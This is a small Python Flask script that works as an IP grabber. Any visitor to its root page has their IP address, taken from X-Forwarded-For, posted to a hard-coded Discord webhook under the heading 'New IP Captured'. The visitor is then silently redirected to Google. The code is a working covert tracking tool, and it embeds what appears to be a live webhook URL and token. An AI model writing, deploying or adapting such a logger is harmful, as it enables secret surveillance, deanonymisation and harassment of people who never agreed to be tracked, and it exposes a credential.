from flask import Flask, request, redirect
import requests

app = Flask(__name__)

# Replace with your actual Discord Webhook URL
# Instructions: Channel Settings > Integrations > Webhooks > New Webhook
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1482323306198601780/bvnAqpLHXijSAMi0fwJQV-IZG2nXdoScT4MFttVL3e42cXtol1HiGDGqR1AdsscKDzKG"

@app.route('/')
def capture_and_redirect():
    # Attempt to get the IP address
    # If the site is behind a proxy (like Heroku or Cloudflare), 
    # the real IP is usually in 'X-Forwarded-For'.
    ip_addr = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Optional: If X-Forwarded-For has multiple IPs, take the first one
    if ip_addr and ',' in ip_addr:
        ip_addr = ip_addr.split(',')[0]

    # Prepare data for Discord
    payload = {
        "embeds": [{
            "title": "🚨 New IP Captured",
            "description": f"**IP Address:** `{ip_addr}`",
            "color": 15158332  # Red color in decimal
        }]
    }

    # Send the IP to Discord
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=payload)
    except Exception as e:
        print(f"Failed to send to Discord: {e}")

    # Redirect the user to Google immediately
    return redirect("https://www.google.com")

if __name__ == "__main__":
    # In production, use a WSGI server like Gunicorn
    app.run(host='0.0.0.0', port=5000)
